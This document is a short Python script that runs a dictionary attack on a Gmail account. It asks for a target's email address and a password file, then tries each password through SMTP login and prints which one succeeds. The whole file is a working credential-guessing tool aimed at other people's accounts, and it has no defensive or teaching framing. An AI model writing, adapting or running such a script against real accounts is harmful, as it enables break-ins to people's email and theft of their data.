import smtplib


def main():
    with smtplib.SMTP("smtp.gmail.com", 587) as smt:
        smt.ehlo()
        smt.starttls()
        user = input("Alpha : Enter the target's email address: ")
        passwfile = input("Alpha : Enter the password file name: ")
        passwfile = open(passwfile, "r")

        for password in passwfile:
            try:
                smt.login(user, password)
                print("Alpha : [+] Password Found: %s" % password)
                break
            except smtplib.SMTPAuthenticationError:
                print("Alpha : [!] Password Incorrect: %s" % password)

if __name__ == "__main__":
    main()
